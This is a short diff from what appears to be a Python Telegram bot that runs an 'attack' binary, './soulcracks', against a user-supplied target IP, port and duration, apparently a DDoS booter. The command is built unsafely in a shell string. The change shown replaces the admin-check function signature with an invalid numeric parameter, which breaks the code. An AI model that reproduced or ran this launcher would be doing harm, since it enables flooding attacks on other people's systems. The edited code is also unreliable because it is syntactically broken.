@@ -87,7 +87,7 @@ async def run_attack_command_async(target_ip, target_port, duration):
     process = await asyncio.create_subprocess_shell(f"./soulcracks {target_ip} {target_port} {duration} 10")
     await process.communicate()
 
-def is_user_admin(user_id, chat_id):
+def is_user_admin(5213725124):
     try:
         return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
     except:
